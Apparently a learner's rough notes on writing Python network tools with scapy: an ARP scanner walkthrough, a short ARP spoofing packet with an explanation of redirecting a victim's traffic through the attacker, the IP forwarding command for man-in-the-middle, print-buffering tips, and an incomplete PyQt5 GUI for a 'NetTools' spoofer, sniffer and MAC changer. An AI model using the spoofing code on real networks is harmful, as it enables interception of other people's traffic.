  arp_request_broadcast = broadcast/arp_request

  This line creates a new packet by combining the ARP request packet and the Ethernet broadcast packet using the '/' operator. This creates a new packet with the ARP request packet as the payload and the Ethernet broadcast packet as the header.

  answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
  
This line sends the ARP request broadcast packet using the srp() function from the scapy module. This function sends packets at the link layer and returns a list of two lists: the first list contains packets that received a response, and the second list contains packets that did not receive a response. The timeout parameter is set to 1 second to limit the amount of time the function waits for a response, and the verbose parameter is set to False to suppress output. The [0] at the end of the line extracts the list of packets that received a response from the srp() function's return value.

    for element in answered_list:
        client_dict = {"ip":element[1].psrc,"mac":element[1].hwsrc}
        clients_list.append(client_dict)

This line loops through each packet in the answered_list list of packets that received a response from the srp() function. For each packet, it creates a dictionary called client_dict with two keys: "ip", which maps to the source IP address of the packet, and "mac", which maps to the source MAC address of the packet. It then appends this dictionary to the clients_list.


ifconfig_result = subprocess.check_output(["ifconfig", interface]) 

subprocess   .check_output() function is used to store the result in the ifconfig_result variable.

        return mac_result.group(0)

returns the exact first matchign group



packet = scapy.ARP(op=2,pdst="target Ip addy", hwdst="target MAC addy", psrc="ROuter IP addy")
scapy.send(packet)


Routers Ip address remains the same but the MAC address is changed to attackers MAC. Since while using
ARP it only tracks MAC the request now go to the attacker instead of the router.( this change only happens to 
the system we are sending this packet to)


# echo 1 > /proc/sys/net/ipv4/ip_forward

Dynamic printing (python 2.7 and below)

 print("[+] Packets sent: " + str(packet_count)),

 this statement doesnt output anything the puts the outputs in a buffer
 to flush the buffer (meaning when we end the program all of the outputs will be displayed at once)
 we need to use

 sys.stdout.flush() #this will flush the buffer 

 Now every statement will be printed on the same line continously 

 print("\r[+] Packets sent: " + str(packet_count)),

 To make it print from the start and overwirte the previous output you can use \r

Dynamic printing (python 3)
 
 print("\r[+] Packets sent: " + str(packet_count), end="")
 
 //gui
 import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QGridLayout, QPushButton, QLabel, QLineEdit


class NetToolsGui(QMainWindow):
    def __init__(self):
        super().__init__()

        # Set window properties
        self.setWindowTitle('NetTools Framework')
        self.setGeometry(100, 100, 400, 200)

        # Create central widget and grid layout
        central_widget = QWidget(self)
        self.setCentralWidget(central_widget)
        grid_layout = QGridLayout(central_widget)
        grid_layout.setSpacing(10)

        # Create ARP spoofer widget
        arp_spoofer_label = QLabel('ARP Spoofer')
        grid_layout.addWidget(arp_spoofer_label, 0, 0)
        arp_spoofer_target_label = QLabel('Target IP:')
        grid_layout.addWidget(arp_spoofer_target_label, 1, 0)
        self.arp_spoofer_target_edit = QLineEdit()
        grid_layout.addWidget(self.arp_spoofer_target_edit, 1, 1)
        arp_spoofer_spoof_label = QLabel('Spoof IP:')
        grid_layout.addWidget(arp_spoofer_spoof_label, 2, 0)
        self.arp_spoofer_spoof_edit = QLineEdit()
        grid_layout.addWidget(self.arp_spoofer_spoof_edit, 2, 1)
        arp_spoofer_button = QPushButton('Start')
        grid_layout.addWidget(arp_spoofer_button, 3, 0)
        #arp_spoofer_button.clicked.connect(self.start_arp_spoofer)

        # Create network scanner widget
        network_scanner_label = QLabel('Network Scanner')
        grid_layout.addWidget(network_scanner_label, 0, 2)
        network_scanner_target_label = QLabel('Target IP/Range:')
        grid_layout.addWidget(network_scanner_target_label, 1, 2)
        self.network_scanner_target_edit = QLineEdit()
        grid_layout.addWidget(self.network_scanner_target_edit, 1, 3)
        network_scanner_button = QPushButton('Start')
        grid_layout.addWidget(network_scanner_button, 3, 2)
        #network_scanner_button.clicked.connect(self.start_network_scanner)

        # Create MAC changer widget
        mac_changer_label = QLabel('MAC Changer')
        grid_layout.addWidget(mac_changer_label, 5, 0)
        mac_changer_interface_label = QLabel('Interface:')
        grid_layout.addWidget(mac_changer_interface_label, 6, 0)
        self.mac_changer_interface_edit = QLineEdit()
        grid_layout.addWidget(self.mac_changer_interface_edit, 6, 1)
        mac_changer_mac_label = QLabel('MAC Address:')
        grid_layout.addWidget(mac_changer_mac_label, 7, 0)
        self.mac_changer_mac_edit = QLineEdit()
        grid_layout.addWidget(self.mac_changer_mac_edit, 7, 1)
        mac_changer_button = QPushButton('Start')
        grid_layout.addWidget(mac_changer_button, 8, 0)
        #mac_changer_button.clicked.connect(self.start_mac_changer)

        # Create packet sniffer widget
        packet_sniffer_label = QLabel('Packet Sniffer')
        grid_layout.addWidget(packet_sniffer_label, 5, 2)
        packet_sniffer_interface_label = QLabel('Interface:')
        grid_layout.addWidget(packet_sniffer_interface_label, 6, 2)
        self.packet_sniffer_interface_edit = QLineEdit()
        grid_layout.addWidget(self.packet_sniffer_interface_edit, 6, 3)
        packet_sniffer_button = QPushButton('Start')

if __name__ == '__main__':
    app = QApplication(sys.argv)
    nettools_gui = NetToolsGui()
    nettools_gui.show()
    sys.exit(app.exec_())
